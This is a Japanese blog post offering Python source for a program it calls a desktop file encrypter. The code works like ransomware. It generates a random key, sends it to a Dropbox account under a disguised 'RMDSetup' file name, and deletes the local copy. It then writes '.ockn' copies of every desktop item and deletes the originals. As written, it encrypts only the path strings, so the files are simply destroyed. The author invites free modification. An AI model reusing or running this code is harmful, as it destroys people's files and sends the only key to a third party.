---
title: Encrypter
slug: encrypter
date: 2020-03-07T08:15:00.000Z
image: /img/enc.jpg
categories:
  - ソフト
archives:
  - 2020/03
---
### 機能

デスクトップにあるファイルを暗号化するプログラム。

### コード

```python
import sys
import getpass
import dropbox
import glob
import random, string
import os.path 
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random 

## パスワードとファイル名のランダム生成

password=''.join([random.choice(string.ascii_letters + string.digits) for i in range(50)])

mdigit=''.join([random.choice(string.digits) for i in range(3)])

## Dropbox設定

TOKEN = "###############################################################"

dbx = dropbox.Dropbox(TOKEN)
dbx.users_get_current_account()

## パスの設定

path_w = os.path.expanduser('~') + "\RMDSetup" + mdigit + ".log"
path = "/txt/RMDSetup" + mdigit + ".txt"

s = password

## 書き込みとアップロード

with open(path_w, mode='w') as f:
    f.write(s)

f = open(path_w, 'rb')
dbx.files_upload(f.read(),path )
f.close()

os.remove(path_w)

## パスワードの確認

password2 = password
if password != password2:
    print('Passwords do not match.')
    sys.exit(0)

## ファイル一覧の取得

files = glob.glob(os.path.expanduser('~') + "\Desktop\*")

## AES暗号化コード

def create_aes(password, iv):
	sha = SHA256.new()
	sha.update(password.encode())
	key = sha.digest()
	return AES.new(key, AES.MODE_CFB, iv)

def encrypt(decrypted_data, password):
	iv = Random.new().read(AES.block_size)
	return iv + create_aes(password, iv).encrypt(decrypted_data)
    
for file in files:
    enc = encrypt(file, password)
    ba = enc
    note = file + ".ockn"
    with open(note, mode='wb') as n:
        n.write(ba)
    os.remove(file)
```

``

``

### 備考

適当に作りましたw\
動作にはpycryptroとdropboxが必要です。\
TOKENは隠してあります。\
自由に改変して、どうぞ。\
あと、動作の保証はできません。